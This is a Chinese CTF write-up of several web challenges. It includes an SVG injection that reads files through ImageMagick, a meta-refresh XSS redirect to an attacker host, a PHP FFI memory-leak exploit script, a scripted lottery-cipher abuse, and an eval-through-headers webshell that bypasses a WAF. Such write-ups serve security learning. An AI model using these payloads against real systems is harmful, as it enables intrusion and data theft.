<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h3><p>赛后复现</p>
<p>进去一个微信聊天记录生成器</p>
<p><img src="https://i.loli.net/2020/06/29/9QYJzjt1snGyBb2.png" alt="image-20200629180644397.png"></p>
<p><code>F12</code>发现生成的是svg</p>
<p><img src="https://i.loli.net/2020/06/29/MkUfJRrbaCengIm.png" alt="image-20200629180854200.png"></p>
<p>然后可以插入表情，格式是[smile]，这里可以实现注入，使xml可控</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[smile&quot;&#x2F;&gt;&lt;&#x2F;g&gt;&lt;&#x2F;g&gt;xxx&lt;g id&#x3D;&quot;evil&quot;&gt;&lt;g&gt;&lt;img a&#x3D;&quot;#]</span><br></pre></td></tr></table></figure>

<p>可以看到这个界面里有两个api，<code>Preview</code>和<code>Share</code></p>
<p><code>Preview</code>可以生成base64的svg</p>
<p><code>Share</code>跳转到一个新页面，返回png图片，这里看<code>F12</code>的<code>network</code>看到图片的源地址<code>http://pwnable.org:5000/image/UWehPJ/png</code></p>
<p>其中的png可以改成别的东西访问，比如<code>gif</code>、<code>htm</code>、<code>pdf</code></p>
<p>查看pdf的属性可以得知是由<code>imagemagick</code>生成的</p>
<p><img src="https://i.loli.net/2020/06/29/R4U1fzrQNvjwCyG.png" alt="image-20200629181941592.png"></p>
<p>写个脚本方便测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preview</span><span class="params">(message)</span>:</span></span><br><span class="line">    url = <span class="string">"http://pwnable.org:5000/preview"</span></span><br><span class="line">    data = &#123;<span class="string">"data"</span>: json.dumps([&#123;<span class="string">"type"</span>: <span class="number">0</span>, <span class="string">"message"</span>: message&#125;])&#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)</span><br><span class="line">    <span class="comment"># j['previewid']</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">share</span><span class="params">(previewid)</span>:</span></span><br><span class="line">    url = <span class="string">"http://pwnable.org:5000/share"</span></span><br><span class="line">    data = &#123;<span class="string">"previewid"</span>: previewid&#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)[<span class="string">'url'</span>][<span class="number">-6</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTypeUrl</span><span class="params">(imageid, t)</span>:</span></span><br><span class="line">    url = <span class="string">f"http://pwnable.org:5000/image/<span class="subst">&#123;imageid&#125;</span>/<span class="subst">&#123;t&#125;</span>"</span></span><br><span class="line">    print(url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    message = input(<span class="string">"message&gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">"e"</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    previewid = preview(message)[<span class="string">'previewid'</span>]</span><br><span class="line">    print(<span class="string">f'previewid : <span class="subst">&#123;previewid&#125;</span>'</span>)</span><br><span class="line">    imageid = share(previewid)</span><br><span class="line">    print(<span class="string">f'imageid : <span class="subst">&#123;imageid&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t = input(<span class="string">"fileType&gt;"</span>)</span><br><span class="line">        <span class="keyword">if</span> t == <span class="string">"e"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        webbrowser.open(getTypeUrl(imageid, t))</span><br></pre></td></tr></table></figure>

<p>大佬payload : <code>[aaa&quot;/&gt;&lt;image href=&quot;text:/flag&quot;/&gt;]</code>，利用png后缀将数据带出</p>
<p><img src="https://i.loli.net/2020/06/29/N8fPQ67Y1TdVXeu.png" alt="image-20200629184541464.png"></p>
<p>现在有任意读了，那就读取一下<code>/proc/self/</code>里的东西</p>
<p><img src="https://i.loli.net/2020/06/29/QNjYdHmoP2aFBxl.png" alt="image-20200629185111633.png"></p>
<p>可以发现proc被过滤了，尝试双写绕过</p>
<p>payload : <code>[a&quot;/&gt;&lt;image href=&quot;text:/prprococ/self/maps&quot;/&gt;]</code></p>
<p>我不知道这里<code>/app</code>他们是怎么找到的，<code>app.py</code>就在<code>/app</code>目录下，把它读出来发现一个路由</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;pwnable.org:5000&#x2F;SUp3r_S3cret_URL&#x2F;0Nly_4dM1n_Kn0ws</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/06/29/VMQ4xXDE9nZCOu1.png" alt="image-20200629190721795.png"></p>
<p><img src="https://i.loli.net/2020/06/29/jmJk7oGHDyBvX1O.png" alt="image-20200629191143075.png"></p>
<p>访问发现需要让admin弹出<code>alert(1)</code></p>
<p>CSP:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">img-src * data:; default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;</span><br></pre></td></tr></table></figure>

<p>有<code>unsafe-inline</code></p>
<p>可以利用前面的可控xml</p>
<p>尝试<code>[a&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;]</code>无果，标签内的东西无法执行。那就用meta标签跳转</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[a&quot;&#x2F;&gt;&lt;meMETAta content&#x3D;&quot;0;url&#x3D;http:&#x2F;&#x2F;ip:port&#x2F;1.html&quot; http-equiv&#x3D;&quot;refresh&quot;&gt;]</span><br></pre></td></tr></table></figure>

<p>生成htm</p>
<p>然后本地弄一个html</p>
<p>然后提交网址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;image&#x2F;eejyFO&#x2F;htm</span><br></pre></td></tr></table></figure>

<p><del>复现的时候本地能弹，但是远程环境好像挂了，理论上发过去就能getflag</del></p>
<p>不能用域名，只能用ip弹，远程环境貌似没有dns</p>
<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>这题open_basedir上车</p>
<p>直接读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(base64_encode(file_get_contents(&#39;&#x2F;flag.so&#39;)));</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{FFi_1s_qu1T3_DANg1ouS}</p>
</blockquote>
<h3 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h3><p>这题不会做，只能跟着大佬wp走了</p>
<p>读目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;));</span><br><span class="line"></span><br><span class="line">array(21) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;bin&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;boot&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;dev&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;etc&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;flag.h&quot;</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;flag.so&quot;</span><br><span class="line">  [6]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;home&quot;</span><br><span class="line">  [7]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;lib&quot;</span><br><span class="line">  [8]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;lib64&quot;</span><br><span class="line">  [9]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;media&quot;</span><br><span class="line">  [10]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;mnt&quot;</span><br><span class="line">  [11]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;opt&quot;</span><br><span class="line">  [12]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;proc&quot;</span><br><span class="line">  [13]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;root&quot;</span><br><span class="line">  [14]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;run&quot;</span><br><span class="line">  [15]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;sbin&quot;</span><br><span class="line">  [16]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;srv&quot;</span><br><span class="line">  [17]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;sys&quot;</span><br><span class="line">  [18]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;tmp&quot;</span><br><span class="line">  [19]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;usr&quot;</span><br><span class="line">  [20]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;var&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到有<code>flag.h</code> 和 <code>flag.so</code></p>
<p>php7.4有FFI，介绍在<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9mZmk=">这里<i class="fa fa-external-link-alt"></i></span></p>
<p>然后整个脚本，这里改改大佬的脚本，加上点我的注释</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://pwnable.org:19261/?rh=eval($_POST[0]);"</span></span><br><span class="line">data = &#123;<span class="string">"0"</span>:</span><br><span class="line">        <span class="string">r'''</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">    $ffi=FFI::load("/flag.h");  // 加载flag</span></span><br><span class="line"><span class="string">    $leak = FFI::new("char[0x50000]", false);  // 申请0x50000个内存地址，char数组</span></span><br><span class="line"><span class="string">    FFI::memcpy($leak, $leak-0x50000, 0x50000);  // 从 $leak-0x50000 复制 0x50000 的数据到 $leak，这里0x50000看情况调整</span></span><br><span class="line"><span class="string">    $tmp = FFI::string($leak,0x50000);  // 转换成string类型，赋值给$tmp</span></span><br><span class="line"><span class="string">    var_dump($tmp);  // 打印出来</span></span><br><span class="line"><span class="string">&#125;catch(FFI\Exception $ex) &#123;</span></span><br><span class="line"><span class="string">    echo $ex-&gt;getMessage(), PHP_EOL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var_dump(1);</span></span><br><span class="line"><span class="string">        '''</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line">print(res.content[:<span class="number">200</span>])</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'leak.dat'</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(res.content)</span><br><span class="line">print(<span class="string">'[+]save leak data into leak.dat'</span>)</span><br><span class="line">print(<span class="string">'==============leak=============='</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&gt;=<span class="number">0</span> <span class="keyword">and</span> i&lt;=len(res.text):</span><br><span class="line">    print(i,res.text[i:i+<span class="number">50</span>])</span><br><span class="line">    i = res.text.find(<span class="string">'flag'</span>,i+<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'==============leak=============='</span>)</span><br><span class="line">name = input(<span class="string">"function name&gt;"</span>)</span><br><span class="line">data = &#123;<span class="string">"0"</span>:<span class="string">r'''</span></span><br><span class="line"><span class="string">$ffi = FFI::load('/flag.h');</span></span><br><span class="line"><span class="string">$a=$ffi-&gt;%s();</span></span><br><span class="line"><span class="string">for($i=0;$i&lt;100;$i++)&#123;</span></span><br><span class="line"><span class="string">    echo $a[$i];</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span> % name&#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/06/30/lP83rCoukpszyKY.png" alt="image.png"></p>
<p>可以看到函数名已经leak出来了</p>
<p>然后执行即可</p>
<p><img src="https://i.loli.net/2020/06/30/91AKR2uWXHaGVQh.png" alt="image.png"></p>
<blockquote>
<p>flag{YoU_C3nT_u3iNg_FPm_n0w}</p>
</blockquote>
<h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><p>买彩票，主要思路是破解enc，兑换别人的彩票。</p>
<p>先把接口都找出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user&#x2F;login     # 登录</span><br><span class="line">&#x2F;user&#x2F;register  # 注册</span><br><span class="line">&#x2F;user&#x2F;info      # 查看用户信息</span><br><span class="line">&#x2F;lottery&#x2F;buy    # 买彩票</span><br><span class="line">&#x2F;lottery&#x2F;info   # 查看彩票信息</span><br><span class="line">&#x2F;lottery&#x2F;charge # 兑换彩票</span><br><span class="line">&#x2F;flag           # 买flag</span><br></pre></td></tr></table></figure>

<p>然后就是先买几张彩票，找规律，主要用到<code>/lottery/info</code>这个接口</p>
<p><code>api.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ranstr</span><span class="params">(num)</span>:</span></span><br><span class="line">    H = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(num):</span><br><span class="line">        salt += random.choice(H)</span><br><span class="line">    <span class="keyword">return</span> salt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password=<span class="string">"crzz"</span>)</span>:</span></span><br><span class="line">    url = <span class="string">"http://pwnable.org:2333/user/register"</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">"username"</span>: username, <span class="string">"password"</span>: password&#125;)</span><br><span class="line">    <span class="comment"># &#123;"user":&#123;"username":"crzz4","uuid":"83cca019-b360-4e81-92d3-d61c415ac2ff","updated_at":"2020-06-28T12:19:11.000000Z","created_at":"2020-06-28T12:19:11.000000Z","id":67094&#125;&#125;</span></span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)</span><br><span class="line">    <span class="comment"># &#123;'message': 'duplicate username'&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password=<span class="string">"crzz"</span>)</span>:</span></span><br><span class="line">    url = <span class="string">"http://pwnable.org:2333/user/login"</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">"username"</span>: username, <span class="string">"password"</span>: password&#125;)</span><br><span class="line">    <span class="comment"># &#123;'user': &#123;'id': 67094, 'uuid': '83cca019-b360-4e81-92d3-d61c415ac2ff', 'username': 'crzz4', 'api_token': 'Mvq0bicVXCi3dPA25n0ooJz14rDHtbeI', 'coin': 26, 'created_at': '2020-06-28T12:19:11.000000Z', 'updated_at': '2020-06-28T12:53:45.000000Z'&#125;&#125;</span></span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uinfo</span><span class="params">(api_token)</span>:</span></span><br><span class="line">    url = <span class="string">f"http://pwnable.org:2333/user/info?api_token=<span class="subst">&#123;api_token&#125;</span>"</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)</span><br><span class="line">    <span class="comment"># 同login</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(api_token)</span>:</span></span><br><span class="line">    url = <span class="string">"http://pwnable.org:2333/lottery/buy"</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">"api_token"</span>: api_token&#125;)</span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)</span><br><span class="line">    <span class="comment"># &#123;'enc':enc&#125; / &#123;'message': 'no enough coin'&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linfo</span><span class="params">(enc)</span>:</span></span><br><span class="line">    url = <span class="string">"http://pwnable.org:2333/lottery/info"</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">"enc"</span>: enc&#125;)</span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)</span><br><span class="line">    <span class="comment"># &#123;'info': &#123;'lottery': '4a400320-e05e-4929-94a1-e62588ac0a78', 'user': '83cca019-b360-4e81-92d3-d61c415ac2ff', 'coin': 5&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span><span class="params">(uuid, coin, enc)</span>:</span></span><br><span class="line">    url = <span class="string">"http://pwnable.org:2333/lottery/charge"</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">"user"</span>: uuid, <span class="string">"coin"</span>: coin, <span class="string">"enc"</span>: enc&#125;)</span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)</span><br><span class="line">    <span class="comment"># []  /  &#123;'message': 'invalid lottery'&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">(api_token)</span>:</span></span><br><span class="line">    url = <span class="string">"http://pwnable.org:2333/flag"</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">"api_token"</span>: api_token&#125;)</span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)</span><br></pre></td></tr></table></figure>

<p>然后就交给密码学大哥来爆破密码了，最后发现是分组密码，只要彩票id后两位相同或者用户id前两位相同就可以互相兑换</p>
<p>然后就根据api写脚本，分布式刷钱了</p>
<p><code>exp.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> api <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_lottery</span><span class="params">()</span>:</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    maxcoins = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">"data.dat"</span>):</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"data.dat"</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            tmp = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">            tmpi = i.strip()</span><br><span class="line">            <span class="keyword">if</span> tmpi:</span><br><span class="line">                tmpi = tmpi.split(<span class="string">'#'</span>)</span><br><span class="line">                data[tmpi[<span class="number">0</span>]] = json.loads(tmpi[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        uname = <span class="string">"crzz"</span> + ranstr(<span class="number">10</span>)</span><br><span class="line">        j = register(uname)  <span class="comment"># 注册</span></span><br><span class="line">        print(j)</span><br><span class="line">        <span class="keyword">if</span> j.get(<span class="string">"message"</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        u = login(uname)  <span class="comment"># 登录</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            <span class="comment"># print(uinfo(u['user']['api_token'])) # 查信息</span></span><br><span class="line">            e = buy(u[<span class="string">'user'</span>][<span class="string">'api_token'</span>])  <span class="comment"># 买彩票</span></span><br><span class="line">            <span class="comment"># print(e)</span></span><br><span class="line">            <span class="keyword">if</span> e.get(<span class="string">"message"</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            l = linfo(e[<span class="string">'enc'</span>])  <span class="comment"># 中奖信息</span></span><br><span class="line">            <span class="comment"># print(l)</span></span><br><span class="line">            pad = l[<span class="string">'info'</span>][<span class="string">'lottery'</span>][<span class="number">-2</span>:]</span><br><span class="line">            <span class="keyword">if</span> pad <span class="keyword">in</span> data:</span><br><span class="line">                <span class="comment"># 修改兑换</span></span><br><span class="line">                enc = e[<span class="string">'enc'</span>][:<span class="number">-108</span>] + data[pad][<span class="string">'enc'</span>][<span class="number">-108</span>:]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 库里没有，直接兑换</span></span><br><span class="line">                enc = e[<span class="string">'enc'</span>]</span><br><span class="line">                <span class="comment"># 将信息入库</span></span><br><span class="line">                data[pad] = &#123;<span class="string">"uname"</span>: uname, <span class="string">"enc"</span>: enc, <span class="string">"user"</span>: u[<span class="string">'user'</span>]</span><br><span class="line">                             [<span class="string">'uuid'</span>], <span class="string">"token"</span>: u[<span class="string">'user'</span>][<span class="string">'api_token'</span>]&#125;</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">"data.dat"</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(<span class="string">'#'</span>.join([pad, json.dumps(data[pad])]) + <span class="string">'\n'</span>)</span><br><span class="line">            print(<span class="string">"\t[+] get coin: &#123;&#125;"</span>.format(l[<span class="string">'info'</span>][<span class="string">'coin'</span>]))</span><br><span class="line">            print(<span class="string">"\t[+] enc: &#123;&#125;"</span>.format(enc))</span><br><span class="line">            print(<span class="string">"\t[+] info: &#123;&#125;"</span>.format(linfo(enc)))</span><br><span class="line">            print(</span><br><span class="line">                <span class="string">"\t[+] charge result: &#123;&#125;"</span>.format(charge(data[pad][<span class="string">'user'</span>], l[<span class="string">'info'</span>][<span class="string">'coin'</span>], enc)))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                info = uinfo(data[pad][<span class="string">'token'</span>])</span><br><span class="line">                print(</span><br><span class="line">                    <span class="string">"\t[+]&#123;&#125; coins sum: &#123;&#125;"</span>.format(data[pad][<span class="string">'uname'</span>], info[<span class="string">'user'</span>][<span class="string">'coin'</span>]))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="comment"># token过期，重新登录</span></span><br><span class="line">                info = login(data[pad][<span class="string">'uname'</span>])</span><br><span class="line">                data[pad][<span class="string">'token'</span>] = info[<span class="string">'user'</span>][<span class="string">'api_token'</span>]</span><br><span class="line">                print(</span><br><span class="line">                    <span class="string">"\t[+]&#123;&#125; coins sum: &#123;&#125;"</span>.format(data[pad][<span class="string">'uname'</span>], info[<span class="string">'user'</span>][<span class="string">'coin'</span>]))</span><br><span class="line">            <span class="keyword">if</span> info[<span class="string">'user'</span>][<span class="string">'coin'</span>] &gt; maxcoins:</span><br><span class="line">                maxcoins = info[<span class="string">'user'</span>][<span class="string">'coin'</span>]</span><br><span class="line">                print(<span class="string">"\t\t[+]now max coins: &#123;&#125;"</span>.format(maxcoins))</span><br><span class="line">            <span class="comment"># 结束条件</span></span><br><span class="line">            <span class="keyword">if</span> info[<span class="string">'user'</span>][<span class="string">'coin'</span>] &gt;= <span class="number">99</span>:</span><br><span class="line">                print(<span class="string">f'<span class="subst">&#123;data[pad][<span class="string">"uname"</span>]&#125;</span> can buyflag.'</span>)</span><br><span class="line">                flag = getflag(data[pad][<span class="string">'token'</span>])</span><br><span class="line">                <span class="keyword">if</span> flag.get(<span class="string">"flag"</span>):</span><br><span class="line">                    print(flag[<span class="string">'flag'</span>])</span><br><span class="line">                    <span class="keyword">with</span> open(<span class="string">"flag"</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        f.write(flag[<span class="string">'flag'</span>])</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    get_lottery()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{f1d6356a-4288-4a13-a28a-78da73328493}</p>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>这次的Misc一点都不Misc，都是MiscPwn和MiscWeb。我因为不会pwn，所以只参与了完成了一题Cloud Computing</p>
<h3 id="Cloud-Computing"><a href="#Cloud-Computing" class="headerlink" title="Cloud Computing"></a>Cloud Computing</h3><p>开局给出一个web🐎</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">'sandbox/'</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) . <span class="string">'/'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">"action"</span>] ?? <span class="string">""</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'pwd'</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">    $data = $_GET[<span class="string">"data"</span>] ?? <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (waf($data)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'waf sucks...'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="string">"$dir"</span> . <span class="string">"index.php"</span>, $data);</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'shell'</span>:</span><br><span class="line">    initShellEnv($dir);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">"index.php"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过简单的测试，怀疑waf是单字符过滤，然后写个脚本测试</p>
<p><code>fuzz.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://pwnable.org:47780/?action=upload&amp;data=%"</span></span><br><span class="line">ban = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    r = requests.get(url+hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">    print(bytes([i]),r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'waf'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        ban.append(i)</span><br><span class="line"></span><br><span class="line">print(bytes(ban))</span><br></pre></td></tr></table></figure>

<p>然后测得过滤了如下字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\t空格!#%&amp;&#39;*+,-.:@ABCDEFGHIJKLMNOPQRSTUVWXYZ^_&#96;|</span><br></pre></td></tr></table></figure>

<p>这里用headers传参就可以简单绕过waf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;pwnable.org:47780&#x2F;?action&#x3D;upload&amp;data&#x3D;%3C%3F%3Deval%28getallheaders%28%29%5B%22p%22%5D%29%3B</span><br></pre></td></tr></table></figure>

<p>因为主页面关闭了报错信息，看着不方便，所以我们在headers那里打开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">headers &#x3D; &#123;&quot;p&quot;:&quot;error_reporting(E_ALL);&quot;+payload&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是绕disable_functions或者open_basedir了</p>
<p>因为这是php7.4.7，FFI也不能用，因此没有什么好绕过disable_functions的方法了，那就针对open_basedir</p>
<p>根据这篇文章构造payload <span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNDcyMCN0b2MtNA==">https://xz.aliyun.com/t/4720#toc-4<i class="fa fa-external-link-alt"></i></span> 可以实现绕过</p>
<p><code>exp.py</code></p>
